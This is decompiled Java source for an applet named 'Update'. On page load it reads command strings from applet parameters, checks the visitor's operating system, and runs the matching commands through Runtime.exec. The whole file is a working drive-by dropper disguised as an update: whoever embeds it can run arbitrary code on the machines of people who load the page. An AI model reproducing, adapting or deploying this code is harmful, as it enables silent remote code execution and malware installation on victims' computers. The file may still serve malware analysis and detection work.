import java.io.IOException;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Update extends Applet
{
    @Override
    public void init() {
        final String parameter = this.getParameter("windows1");
        final String parameter2 = this.getParameter("windows2");
        final String parameter3 = this.getParameter("linux1");
        final String parameter4 = this.getParameter("linux2");
        final String parameter5 = this.getParameter("unix1");
        final String parameter6 = this.getParameter("unix2");
        final String lowerCase = System.getProperty("os.name").toLowerCase();
        if (lowerCase.indexOf("win") >= 0) {
            try {
                Runtime.getRuntime().exec(parameter);
                Runtime.getRuntime().exec(parameter2);
            }
            catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        if (lowerCase.indexOf("mac") >= 0) {
            try {
                Runtime.getRuntime().exec(parameter5);
                Runtime.getRuntime().exec(parameter6);
            }
            catch (IOException ex2) {
                ex2.printStackTrace();
            }
        }
        if (lowerCase.indexOf("lin") < 0) {
            return;
        }
        try {
            Runtime.getRuntime().exec(parameter3);
            Runtime.getRuntime().exec(parameter4);
        }
        catch (IOException ex3) {
            ex3.printStackTrace();
        }
    }
}
